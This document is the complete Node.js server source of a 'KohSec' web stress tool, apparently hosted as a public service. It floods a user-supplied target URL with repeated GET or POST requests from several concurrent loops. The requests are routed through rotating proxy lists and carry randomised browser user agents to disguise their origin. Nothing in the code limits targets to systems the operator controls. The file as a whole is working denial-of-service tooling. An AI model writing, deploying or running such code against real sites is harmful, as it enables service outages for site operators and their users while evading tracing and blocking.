const express = require('express');
const path = require('path');
const http = require('http');
const https = require('https');
const url = require('url');

const app = express();
const port = process.env.PORT || 3000;

app.use(express.json({ limit: '10mb' })); // Allow larger payloads for proxy lists
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

let activeKohSec = null;

const uaPresets = {
    windows: [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0'
    ],
    linux: [
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
    ],
    ios: [
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1'
    ]
};

function getRandomUA(profile) {
    if (profile === 'custom') return null;
    const list = uaPresets[profile] || uaPresets.windows;
    return list[Math.floor(Math.random() * list.length)];
}

// Parse proxy list from text content
function parseProxies(proxyText) {
    if (!proxyText || typeof proxyText !== 'string') return [];

    const lines = proxyText.split(/\r?\n/).filter(line => line.trim());
    const proxies = [];

    for (const line of lines) {
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith('#')) continue;

        try {
            // Parse proxy URL format: protocol://host:port
            const proxyUrl = new URL(trimmed);
            const protocol = proxyUrl.protocol.replace(':', '');

            if (['http', 'https', 'socks4', 'socks5'].includes(protocol)) {
                proxies.push({
                    protocol,
                    host: proxyUrl.hostname,
                    port: parseInt(proxyUrl.port) || (protocol.startsWith('socks') ? 1080 : 80),
                    auth: proxyUrl.username ? `${proxyUrl.username}:${proxyUrl.password}` : null,
                    raw: trimmed
                });
            }
        } catch (e) {
            // Try parsing as ip:port (assume HTTP)
            const match = trimmed.match(/^(\d+\.\d+\.\d+\.\d+):(\d+)$/);
            if (match) {
                proxies.push({
                    protocol: 'http',
                    host: match[1],
                    port: parseInt(match[2]),
                    auth: null,
                    raw: `http://${trimmed}`
                });
            }
        }
    }

    return proxies;
}

// Get rotating proxy
function getNextProxy(proxies, index) {
    if (!proxies || proxies.length === 0) return null;
    return proxies[index % proxies.length];
}

// Send request through HTTP proxy
function sendRequestViaHttpProxy(proxy, targetUrl, options, payload, callback) {
    const isHttps = targetUrl.protocol === 'https:';
    const targetPort = targetUrl.port || (isHttps ? 443 : 80);

    if (isHttps) {
        // HTTPS through proxy requires CONNECT tunnel
        const connectReq = http.request({
            host: proxy.host,
            port: proxy.port,
            method: 'CONNECT',
            path: `${targetUrl.hostname}:${targetPort}`,
            headers: {
                'Host': `${targetUrl.hostname}:${targetPort}`,
                ...(proxy.auth ? { 'Proxy-Authorization': 'Basic ' + Buffer.from(proxy.auth).toString('base64') } : {})
            }
        });

        connectReq.on('connect', (res, socket) => {
            if (res.statusCode === 200) {
                const httpsReq = https.request({
                    ...options,
                    socket,
                    agent: false
                }, callback);

                httpsReq.on('error', () => callback(null, true));
                if (payload) httpsReq.write(payload);
                httpsReq.end();
            } else {
                callback(null, true);
            }
        });

        connectReq.on('error', () => callback(null, true));
        connectReq.end();
    } else {
        // HTTP through proxy - simple forward
        const proxyReq = http.request({
            host: proxy.host,
            port: proxy.port,
            method: options.method,
            path: targetUrl.href,
            headers: {
                ...options.headers,
                'Host': targetUrl.host,
                ...(proxy.auth ? { 'Proxy-Authorization': 'Basic ' + Buffer.from(proxy.auth).toString('base64') } : {})
            }
        }, callback);

        proxyReq.on('error', () => callback(null, true));
        if (payload) proxyReq.write(payload);
        proxyReq.end();
    }
}

// Send direct request (no proxy)
function sendDirectRequest(targetUrl, options, payload, callback) {
    const protocol = targetUrl.protocol === 'https:' ? https : http;

    const req = protocol.request(options, callback);
    req.on('error', () => callback(null, true));
    if (payload) req.write(payload);
    req.end();
}

app.post('/api/start', (req, res) => {
    if (activeKohSec) {
        return res.status(400).json({ error: 'KohSec-Tool already running' });
    }

    let { target, threads, duration, uaProfile, customUA, payload, proxyList } = req.body;

    threads = Math.max(1, Math.min(30, Number(threads) || 5));
    duration = Math.max(10, Math.min(300, Number(duration) || 60));

    // Normalize target
    if (!target.includes('://')) {
        if (target.includes(':')) {
            target = `http://${target}`;
        } else {
            target = `http://${target}:8080`;
        }
    }

    let targetUrl;
    try {
        targetUrl = new URL(target);
    } catch (e) {
        return res.status(400).json({ error: 'Invalid target URL/format' });
    }

    // Parse proxies
    const proxies = parseProxies(proxyList);
    const proxyMode = proxies.length > 0;

    console.log(`[START] ${target} | threads:${threads} | dur:${duration}s | ua:${uaProfile} | proxies:${proxies.length}`);

    activeKohSec = {
        running: true,
        startTime: Date.now(),
        requestsSent: 0,
        errors: 0,
        proxyCount: proxies.length,
        proxyRotations: 0,
        endTime: Date.now() + duration * 1000
    };

    let proxyIndex = 0;

    function sendRequest() {
        if (!activeKohSec?.running || Date.now() >= activeKohSec.endTime) return;

        const currentProxy = proxyMode ? getNextProxy(proxies, proxyIndex++) : null;
        if (proxyMode) activeKohSec.proxyRotations++;

        const options = {
            hostname: targetUrl.hostname,
            port: targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80),
            path: targetUrl.pathname + targetUrl.search,
            method: payload ? 'POST' : 'GET',
            headers: {
                'User-Agent': customUA || getRandomUA(uaProfile) || uaPresets.windows[0],
                'Connection': 'keep-alive',
                ...(payload ? { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) } : {})
            }
        };

        const handleResponse = (response, isError) => {
            if (isError) {
                activeKohSec.errors++;
            }
            activeKohSec.requestsSent++;
            if (response) {
                response.on('data', () => { });
            }
        };

        if (currentProxy && currentProxy.protocol === 'http') {
            sendRequestViaHttpProxy(currentProxy, targetUrl, options, payload, handleResponse);
        } else {
            // Direct request or unsupported proxy type (fall back to direct)
            sendDirectRequest(targetUrl, options, payload, handleResponse);
        }

        setTimeout(sendRequest, 1000 / (threads * 1.5));
    }

    // Launch threads
    for (let i = 0; i < threads; i++) {
        setTimeout(sendRequest, i * 150);
    }

    // Auto-stop safety
    setTimeout(() => {
        if (activeKohSec) {
            activeKohSec.running = false;
            activeKohSec = null;
            console.log('[AUTO-STOP] Safety timeout');
        }
    }, duration * 1000 + 10000);

    res.json({ status: 'started', proxiesLoaded: proxies.length });
});

app.post('/api/stop', (req, res) => {
    if (activeKohSec) {
        activeKohSec.running = false;
        const wasSent = activeKohSec.requestsSent;
        activeKohSec = null;
        console.log(`[STOP] Aborted – ${wasSent} requests sent`);
        return res.json({ status: 'stopped' });
    }
    res.json({ status: 'idle' });
});

app.get('/api/status', (req, res) => {
    res.json(activeKohSec || { running: false, requestsSent: 0, errors: 0, proxyCount: 0 });
});

app.listen(port, () => {
    console.log(`KOHSEC Stress Tool → https://kohsec-stresser.onrender.com`);
});
